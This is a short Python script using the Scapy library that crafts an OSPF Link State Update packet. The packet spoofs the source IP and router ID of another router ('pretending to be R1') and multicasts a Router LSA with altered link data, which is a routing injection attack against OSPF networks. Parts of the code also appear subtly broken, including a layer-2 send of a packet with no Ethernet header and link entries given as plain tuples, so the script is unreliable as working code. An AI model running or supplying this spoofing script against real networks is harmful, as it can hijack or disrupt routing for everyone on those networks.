from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.contrib.ospf import OSPF_Hdr, OSPF_LSUpd, OSPF_Router_LSA

# Define the interface to use for sending the packet
interface = "eth0"

# OSPF packet details
src_ip = "10.0.0.1"  # Spoofed IP of the sending router (e.g., R1's IP)
dst_ip = "224.0.0.5"  # All OSPF routers multicast address

# Create the IP header
ip = IP(src=src_ip, dst=dst_ip)

# Create the OSPF header
ospf_header = OSPF_Hdr(
    version=2,
    type=4,  # Type 4 for LSA Update
    src=src_ip,  # Spoofed as R1
    area=0,  # OSPF Area 0
    routerid="1.1.1.1",  # OSPF router ID (as R1)
)

# Construct a Router LSA (Type 1) with altered data
router_lsa = OSPF_Router_LSA(
    id="2.2.2.2",  # ID of the LSA (target)
    adrouter="1.1.1.1",  # Advertising router ID (pretending to be R1)
    seq=0x80000001,  # Sequence number (increment for each update)
    lsalength=36,
    options=0x2,  # Options field
    linklist=[("10.0.0.2", "255.255.255.0", 1, 10, 0)],  # Example link data
)

# Create the LSA Update packet
lsa_update = OSPF_LSUpd(lsacount=1, lsas=[router_lsa])

# Combine everything into a complete packet
ospf_packet = ip / ospf_header / lsa_update

# Send the crafted packet
sendp(ospf_packet, iface=interface, verbose=True)
